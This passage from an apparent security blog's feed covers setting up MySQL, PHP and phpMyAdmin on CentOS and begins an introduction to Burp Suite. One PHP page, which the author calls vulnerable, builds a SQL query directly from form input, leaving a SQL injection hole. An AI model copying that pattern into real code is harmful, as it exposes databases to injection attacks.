<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost site]# ls -la
</span><span class='line'>total 8
</span><span class='line'>drwxr-xr-x. 2 root root 42 Mar 30 14:03 .
</span><span class='line'>drwxr-xr-x. 3 root root 76 Mar 30 13:30 ..
</span><span class='line'>-rw-r--r--. 1 root root 26 Mar 30 13:21 index.html
</span><span class='line'>-rw-r--r--. 1 root root 71 Mar 30 14:03 updates.html</span></code></pre></td></tr></table></div></figure>


<p>It might not look like much for the 2 small files I have here, but in a huge code environment, you will feel the difference!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Your boss climbed the corporate ladder, \
</span><span class='line'>\ wrong by wrong.                         /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Setting up MySQL and PHP on Apache]]></title>
    <link href="http://chousensha.github.io/blog/2017/02/25/setting-up-mysql-and-php-on-apache/"/>
    <updated>2017-02-25T03:58:37-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/02/25/setting-up-mysql-and-php-on-apache</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since my last post, but a full time job + the Cisco Cybersecurity scholarship are really eating into my time. But I will try to sneak a post here and there, whenever I can!</p>

<p>In a <a href="http://chousensha.github.io/blog/2016/08/05/getting-started-with-apache/">previous post</a>, I made a tutorial about setting up Apache on CentOS. The next step is to fire a MySQL server and put some databases on that web server!</p>

<!-- more -->


<h2>Installing MySQL server</h2>

<p>First, we need to visit the <a href="https://dev.mysql.com/downloads/repo/yum/">MySQL community repository</a> to download the server package:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget https://repo.mysql.com/mysql57-community-release-el7-9.noarch.rpm
</span><span class='line'>--2017-01-19 10:06:02--  https://repo.mysql.com/mysql57-community-release-el7-9.noarch.rpm
</span><span class='line'>Resolving repo.mysql.com (repo.mysql.com)... 104.87.9.47
</span><span class='line'>Connecting to repo.mysql.com (repo.mysql.com)|104.87.9.47|:443... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 9224 (9.0K) [application/x-redhat-package-manager]
</span><span class='line'>Saving to: ‘mysql57-community-release-el7-9.noarch.rpm’
</span><span class='line'>
</span><span class='line'>100%[===========================================================================================================&gt;] 9,224       --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2017-01-19 10:06:02 (137 MB/s) - ‘mysql57-community-release-el7-9.noarch.rpm’ saved [9224/9224]</span></code></pre></td></tr></table></div></figure>


<p>Next we install the package:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -ivh mysql57-community-release-el7-9.noarch.rpm 
</span><span class='line'>warning: mysql57-community-release-el7-9.noarch.rpm: Header V3 DSA/SHA1 Signature, key ID 5072e1f5: NOKEY
</span><span class='line'>Preparing...                          ################################# [100%]
</span><span class='line'>Updating / installing...
</span><span class='line'>   1:mysql57-community-release-el7-9  ################################# [100%]</span></code></pre></td></tr></table></div></figure>


<p>After running <code>yum update</code> and waiting for a while, you can install MySQL server from the newly added repository with <code>yum install mysql-server</code>.</p>

<p>After the installation, a new user has been created in <code>/etc/passwd</code>, and a group in <code>/etc/group</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/passwd | grep mysql
</span><span class='line'>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
</span><span class='line'>
</span><span class='line'>cat /etc/group | grep mysql
</span><span class='line'>mysql:x:27:</span></code></pre></td></tr></table></div></figure>


<h2>Configuration</h2>

<p>Next, start the service with <code>systemctl start mysqld</code>. The next step is to run the <code>mysql_secure_installation</code> binary to make some security configurations to your server, but for that you need the temporary root password that was generated during installation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep 'password' /var/log/mysqld.log
</span><span class='line'>2017-01-19T08:53:45.638708Z 1 [Note] A temporary password is generated for root@localhost: hoPAejdrk6_a</span></code></pre></td></tr></table></div></figure>


<p>After running <code>mysql_secure_installation</code>, you will be asked to change the root password in accordance with a policy that requires 12 characters, with a mix of uppercase, lowercase, numbers and special characters. Then you will be prompted to answer some questions regarding the removal of anonymous users, test databases, and disallowing remote root login.</p>

<p>To access your MySQL instance via the command line, log in as root and give your password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql -u root -p
</span><span class='line'>Enter password: 
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 16
</span><span class='line'>Server version: 5.7.17 MySQL Community Server (GPL)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s look at what databases are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>show databases;
</span><span class='line'>+--------------------+
</span><span class='line'>| Database           |
</span><span class='line'>+--------------------+
</span><span class='line'>| information_schema |
</span><span class='line'>| mysql              |
</span><span class='line'>| performance_schema |
</span><span class='line'>| sys                |
</span><span class='line'>+--------------------+
</span><span class='line'>4 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>I created a new database to play with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; create database vip;
</span><span class='line'>Query OK, 1 row affected (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>Now change the current DB to point the one you created:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; use vip;
</span><span class='line'>Database changed</span></code></pre></td></tr></table></div></figure>


<h3>Backup and restoration</h3>

<p>Before throwing some data into it, let&rsquo;s first see how to back up data and restore it. For this, we have the <strong>mysqldump</strong> utility. To make a backup of my newly created DB, I typed: <code>mysqldump -u root -p vip > backup.sql</code>.</p>

<p>Then I deleted the DB with the <code>drop database vip;</code> command. For some reason though, I could not restore the DB without first creating a DB with the same name. The restore command is <code>mysql -u root -p vip &lt; backup.sql</code>.</p>

<h3>Adding data to DB</h3>

<p>The database is all well and good, but we need to put a table in there!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="n">users</span> <span class="p">(</span>
</span><span class='line'><span class="n">name</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>I made a <em>users</em> table with one column for the <em>name</em>. Let&rsquo;s confirm this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; show tables;
</span><span class='line'>+---------------+
</span><span class='line'>| Tables_in_vip |
</span><span class='line'>+---------------+
</span><span class='line'>| users         |
</span><span class='line'>+---------------+
</span><span class='line'>1 row in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>Next, I made some users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; insert into users values ('root');
</span><span class='line'>Query OK, 1 row affected (0.04 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; insert into users values ('guest');
</span><span class='line'>Query OK, 1 row affected (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; select * from users;
</span><span class='line'>+-------+
</span><span class='line'>| name  |
</span><span class='line'>+-------+
</span><span class='line'>| root  |
</span><span class='line'>| guest |
</span><span class='line'>+-------+
</span><span class='line'>2 rows in set (0.00 sec)</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the DB in action by integrating it with some PHP!</p>

<h2>Installing PHP</h2>

<p>Installing PHP on CentOS can be done with the following command: <code>yum install php php-mysql</code></p>

<p>The next step is to write some PHP code to connect to the DB. But this is not Debian, so nothing just works! There is the pesky SELinux to take into account, and it&rsquo;s not letting Apache to reach the MySQL DB. Use <strong>getsebool</strong> to see the boolean values for the web server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getsebool -a | grep httpd
</span><span class='line'>httpd_anon_write --&gt; off
</span><span class='line'>httpd_builtin_scripting --&gt; on
</span><span class='line'>httpd_can_check_spam --&gt; off
</span><span class='line'>httpd_can_connect_ftp --&gt; off
</span><span class='line'>httpd_can_connect_ldap --&gt; off
</span><span class='line'>httpd_can_connect_mythtv --&gt; off
</span><span class='line'>httpd_can_connect_zabbix --&gt; off
</span><span class='line'>httpd_can_network_connect --&gt; off
</span><span class='line'>httpd_can_network_connect_cobbler --&gt; off
</span><span class='line'>httpd_can_network_connect_db --&gt; off
</span><span class='line'>httpd_can_network_memcache --&gt; off
</span><span class='line'>httpd_can_network_relay --&gt; off
</span><span class='line'>httpd_can_sendmail --&gt; off
</span><span class='line'>httpd_dbus_avahi --&gt; off
</span><span class='line'>httpd_dbus_sssd --&gt; off
</span><span class='line'>httpd_dontaudit_search_dirs --&gt; off
</span><span class='line'>httpd_enable_cgi --&gt; on
</span><span class='line'>httpd_enable_ftp_server --&gt; off
</span><span class='line'>httpd_enable_homedirs --&gt; off
</span><span class='line'>httpd_execmem --&gt; off
</span><span class='line'>httpd_graceful_shutdown --&gt; on
</span><span class='line'>httpd_manage_ipa --&gt; off
</span><span class='line'>httpd_mod_auth_ntlm_winbind --&gt; off
</span><span class='line'>httpd_mod_auth_pam --&gt; off
</span><span class='line'>httpd_read_user_content --&gt; off
</span><span class='line'>httpd_run_ipa --&gt; off
</span><span class='line'>httpd_run_preupgrade --&gt; off
</span><span class='line'>httpd_run_stickshift --&gt; off
</span><span class='line'>httpd_serve_cobbler_files --&gt; off
</span><span class='line'>httpd_setrlimit --&gt; off
</span><span class='line'>httpd_ssi_exec --&gt; off
</span><span class='line'>httpd_sys_script_anon_write --&gt; off
</span><span class='line'>httpd_tmp_exec --&gt; off
</span><span class='line'>httpd_tty_comm --&gt; off
</span><span class='line'>httpd_unified --&gt; off
</span><span class='line'>httpd_use_cifs --&gt; off
</span><span class='line'>httpd_use_fusefs --&gt; off
</span><span class='line'>httpd_use_gpg --&gt; off
</span><span class='line'>httpd_use_nfs --&gt; off
</span><span class='line'>httpd_use_openstack --&gt; off
</span><span class='line'>httpd_use_sasl --&gt; off
</span><span class='line'>httpd_verify_dns --&gt; off</span></code></pre></td></tr></table></div></figure>


<p>As you can see, by default Apache is very limited in what it can do. Let&rsquo;s change that and allow it to connect to the DB server, and make the change persist across reboots:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>setsebool -P httpd_can_network_connect_db 1</span></code></pre></td></tr></table></div></figure>


<p>If you check again, you will see that the <code>httpd_can_network_connect_db</code> boolean is now set to on. I&rsquo;ve used the code from the <a href="http://php.net/manual/en/function.mysqli-connect.php">PHP mysqli_connect() documentation</a> to check the connection status, and finally, it went from failure to success.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="s2">&quot;my_user&quot;</span><span class="p">,</span> <span class="s2">&quot;my_password&quot;</span><span class="p">,</span> <span class="s2">&quot;my_db&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$link</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;Error: Unable to connect to MySQL.&quot;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;Debugging errno: &quot;</span> <span class="o">.</span> <span class="nx">mysqli_connect_errno</span><span class="p">()</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;Debugging error: &quot;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
</span><span class='line'>    <span class="k">exit</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Success: A proper connection to MySQL was made! The my_db database is great.&quot;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Host information: &quot;</span> <span class="o">.</span> <span class="nx">mysqli_get_host_info</span><span class="p">(</span><span class="nv">$link</span><span class="p">)</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, I made a really basic, vulnerable page just to see if things are working. I placed the following PHP file in my web server directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;reallyproform.php&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">Enter</span> <span class="nx">a</span> <span class="nx">name</span> <span class="nx">in</span> <span class="k">this</span> <span class="nx">box</span> <span class="nx">to</span> <span class="nx">see</span> <span class="k">if</span> <span class="nx">you</span> <span class="nx">know</span> <span class="nx">anyone</span> <span class="nx">in</span> <span class="nx">the</span> <span class="nx">VIP</span> <span class="nx">area</span><span class="o">:</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span> <span class="o">/&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;Submit&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">body</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="s2">&quot;database name&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE name = &#39;&quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>           <span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span><span class="s2">&quot;Yes you are. Proceed&quot;</span><span class="p">;</span>
</span><span class='line'>           <span class="p">}</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Are you sure you&#39;re supposed to be here?&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/page.png" title="Sample PHP page" alt="PHP form"></p>

<p>If you enter a valid username, you will just get a message, but this was just an example to show a working connection between the PHP code hosted on the server and the MySQL database.</p>

<h3>phpMyAdmin setup</h3>

<p>Chances are, you won&rsquo;t feel an urge to always interact with your DB via the command line. The last step in this post is to install and configure phpMyAdmin in order to do all the SQL operations from a web interface.</p>

<p>First, install it with the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install phpmyadmin</span></code></pre></td></tr></table></div></figure>


<p>Restart Apache and go to <a href="http://127.0.0.1/phpmyadmin">http://127.0.0.1/phpmyadmin</a> to see your new phpMyAdmin interface.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You plan things that you do not even \
</span><span class='line'>| attempt because of your extreme      |
</span><span class='line'>\ caution.                             /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introduction to Burp Suite]]></title>
    <link href="http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite/"/>
    <updated>2016-11-19T17:01:23-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite</id>
    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<p><a href="http://aetherlab.teachable.com/p/burp-suite">Free introductory course on Burp Suite</a></p>

<p><a href="https://vimeo.com/album/3510171">Burp Suite for Web Application Security</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap.png" title="sitemap" alt="target sitemap"></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap-menu.png" title="sitemap menu" alt="target sitemap menu"></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/sitemap-filter.png" title="sitemap filter" alt="target sitemap filter"></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/burp/proxy-options.png" title="proxy response options" alt="response modification options"></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

